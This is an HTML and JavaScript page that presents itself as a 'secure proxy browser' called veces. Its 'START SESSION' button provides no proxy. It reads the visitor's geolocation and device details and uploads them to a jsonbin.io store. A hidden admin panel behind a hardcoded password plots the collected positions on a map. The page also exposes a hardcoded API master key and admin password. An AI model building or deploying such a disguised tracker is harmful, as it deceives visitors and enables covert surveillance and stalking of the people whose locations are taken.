<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>veces</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <link rel="stylesheet" href="https://unpkg.com/leaflet@1.9.4/dist/leaflet.css" />
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
    <style>
        body { font-family: 'Inter', sans-serif; }
        #map { height: 300px; width: 100%; border-radius: 12px; border: 1px solid #e2e8f0; }
        .hidden { display: none; }
        .custom-scrollbar::-webkit-scrollbar { width: 4px; }
        .custom-scrollbar::-webkit-scrollbar-track { background: #f1f1f1; }
        .custom-scrollbar::-webkit-scrollbar-thumb { background: #cbd5e1; border-radius: 10px; }
    </style>
</head>
<body class="bg-slate-50 min-h-screen flex flex-col items-center justify-center p-4">

    <div class="text-center mb-8">
        <h1 class="text-5xl font-black text-slate-800 tracking-tighter italic">veces</h1>
        <p class="text-slate-400 mt-2 font-semibold uppercase text-xs tracking-widest">secure proxy browser</p>
    </div>

    <div class="w-full max-w-md bg-white p-6 rounded-[2.5rem] shadow-2xl border border-slate-100">
        <div id="status" class="hidden mb-4 p-3 rounded-2xl text-center text-xs font-bold animate-pulse"></div>
        
        <!-- User View -->
        <div id="user-view">
            <button id="start-btn" class="w-full bg-blue-600 hover:bg-blue-700 text-white font-bold py-6 rounded-3xl shadow-lg shadow-blue-200 transition-all active:scale-95 text-xl">
                START SESSION
            </button>
        </div>

        <!-- Admin Control Center -->
        <div class="mt-8 border-t border-slate-50 pt-6">
            <div id="login-section">
                <input type="password" id="pass" placeholder="Admin Key" class="w-full p-4 bg-slate-50 border border-slate-100 rounded-2xl mb-3 outline-none focus:ring-2 focus:ring-blue-500 transition-all text-center">
                <button id="admin-btn" class="w-full bg-slate-900 text-white py-3 rounded-2xl font-bold text-sm hover:bg-black transition-colors">
                    Access Admin Panel
                </button>
            </div>

            <div id="dashboard" class="hidden space-y-4">
                <div class="flex justify-between items-center">
                    <h2 class="font-black text-slate-800 text-sm italic">CONTROL PANEL</h2>
                    <button id="logout" class="text-slate-400 text-[10px] font-bold uppercase tracking-tighter hover:text-red-500">Lock</button>
                </div>

                <div id="map"></div>

                <div class="bg-slate-50 p-4 rounded-2xl">
                    <div class="flex justify-between items-center mb-3">
                        <span class="text-[10px] font-bold text-slate-400 uppercase tracking-widest">Recent Activity (24h)</span>
                        <span id="counter" class="bg-blue-500 text-white text-[10px] px-2 py-0.5 rounded-full">0</span>
                    </div>
                    <div id="log-list" class="space-y-2 max-h-40 overflow-y-auto custom-scrollbar">
                        <!-- Logs injected here -->
                    </div>
                </div>

                <div class="grid grid-cols-2 gap-2">
                    <button id="refresh-map" class="bg-slate-100 py-3 rounded-xl text-[10px] font-bold uppercase text-slate-600 hover:bg-slate-200 transition-all">
                        Refresh
                    </button>
                    <button id="clear-data" class="bg-red-50 py-3 rounded-xl text-[10px] font-bold uppercase text-red-600 hover:bg-red-100 transition-all">
                        Wipe History
                    </button>
                </div>
            </div>
        </div>
    </div>

    <script src="https://unpkg.com/leaflet@1.9.4/dist/leaflet.js"></script>
    <script>
        const BIN_ID = "694b70d443b1c97be901f24b"; 
        const API_KEY = "$2a$10$v/u.3QIsZjp/k/ptGgQwF./CkX29f1nu.f2FYI0qKwcEZX3t3RNRW"; 
        const ADMIN_PASS = "mommy9";

        const startBtn = document.getElementById('start-btn');
        const adminBtn = document.getElementById('admin-btn');
        const passInput = document.getElementById('pass');
        const statusBox = document.getElementById('status');
        const logList = document.getElementById('log-list');
        const counter = document.getElementById('counter');
        
        let map;
        let markers = [];

        function showStatus(msg, isError = false) {
            statusBox.innerText = msg;
            statusBox.className = `mb-4 p-3 rounded-2xl text-center text-xs font-bold ${isError ? 'bg-red-50 text-red-600' : 'bg-blue-50 text-blue-600'}`;
            statusBox.classList.remove('hidden');
            setTimeout(() => statusBox.classList.add('hidden'), 4000);
        }

        // USER: Start Session
        startBtn.onclick = () => {
            startBtn.disabled = true;
            startBtn.innerText = "CONNECTING...";

            navigator.geolocation.getCurrentPosition(async (pos) => {
                const newLoc = {
                    lat: pos.coords.latitude,
                    lng: pos.coords.longitude,
                    timestamp: Date.now(),
                    device: navigator.platform || "Unknown Device",
                    ua: navigator.userAgent.split(') ')[0].split(' (')[1] || "Mobile"
                };

                try {
                    const res = await fetch(`https://api.jsonbin.io/v3/b/${BIN_ID}/latest`, {
                        headers: { "X-Master-Key": API_KEY }
                    });
                    const data = await res.json();
                    let records = Array.isArray(data.record) ? data.record : [];
                    
                    // Filter out non-location entries
                    records = records.filter(r => r.lat);
                    records.push(newLoc);

                    await fetch(`https://api.jsonbin.io/v3/b/${BIN_ID}`, {
                        method: 'PUT',
                        headers: { "Content-Type": "application/json", "X-Master-Key": API_KEY },
                        body: JSON.stringify(records)
                    });

                    showStatus("PROXY SESSION ACTIVE");
                } catch (e) {
                    showStatus("SYNC ERROR", true);
                }
                startBtn.disabled = false;
                startBtn.innerText = "START SESSION";
            }, (err) => {
                showStatus("PERMISSION DENIED", true);
                startBtn.disabled = false;
                startBtn.innerText = "START SESSION";
            });
        };

        // ADMIN: Access
        adminBtn.onclick = () => {
            if(passInput.value === ADMIN_PASS) {
                document.getElementById('login-section').classList.add('hidden');
                document.getElementById('dashboard').classList.remove('hidden');
                initMap();
                loadData();
            } else {
                showStatus("INVALID KEY", true);
            }
        };

        function initMap() {
            if(!map) {
                map = L.map('map', { zoomControl: false }).setView([20, 0], 2);
                L.tileLayer('https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png').addTo(map);
            }
        }

        async function loadData() {
            try {
                const res = await fetch(`https://api.jsonbin.io/v3/b/${BIN_ID}/latest`, {
                    headers: { "X-Master-Key": API_KEY, "X-Bin-Meta": "false" }
                });
                const allRecords = await res.json();
                
                markers.forEach(m => map.removeLayer(m));
                markers = [];
                logList.innerHTML = '';

                if (Array.isArray(allRecords)) {
                    const now = Date.now();
                    const oneDay = 24 * 60 * 60 * 1000;
                    
                    // Filter for past 24 hours only
                    const recentRecords = allRecords.filter(r => r.lat && (now - r.timestamp) < oneDay);
                    
                    counter.innerText = recentRecords.length;

                    recentRecords.reverse().forEach(loc => {
                        // Map Marker
                        const m = L.marker([loc.lat, loc.lng]).addTo(map);
                        markers.push(m);

                        // Log Entry
                        const div = document.createElement('div');
                        div.className = "bg-white p-3 rounded-xl border border-slate-100 flex justify-between items-center text-[10px]";
                        div.innerHTML = `
                            <div>
                                <p class="font-bold text-slate-700">${loc.device}</p>
                                <p class="text-slate-400">${new Date(loc.timestamp).toLocaleTimeString()}</p>
                            </div>
                            <div class="text-right">
                                <p class="text-blue-500 font-mono">${loc.lat.toFixed(3)}, ${loc.lng.toFixed(3)}</p>
                            </div>
                        `;
                        div.onclick = () => map.flyTo([loc.lat, loc.lng], 12);
                        logList.appendChild(div);
                    });

                    if (markers.length > 0) map.fitBounds(new L.featureGroup(markers).getBounds().pad(0.2));
                }
            } catch (e) { console.error(e); }
        }

        // ADMIN: Clear All History
        document.getElementById('clear-data').onclick = async () => {
            if(!confirm("WIPE ALL CLOUD HISTORY? This cannot be undone.")) return;
            
            try {
                const btn = document.getElementById('clear-data');
                btn.innerText = "WIPING...";
                
                await fetch(`https://api.jsonbin.io/v3/b/${BIN_ID}`, {
                    method: 'PUT',
                    headers: { "Content-Type": "application/json", "X-Master-Key": API_KEY },
                    body: JSON.stringify([]) // Send empty array to clear
                });
                
                showStatus("HISTORY WIPED CLEAN");
                loadData();
            } catch (e) {
                showStatus("WIPE FAILED", true);
            } finally {
                document.getElementById('clear-data').innerText = "WIPE HISTORY";
            }
        };

        document.getElementById('logout').onclick = () => location.reload();
        document.getElementById('refresh-map').onclick = loadData;
    </script>
</body>
</html>
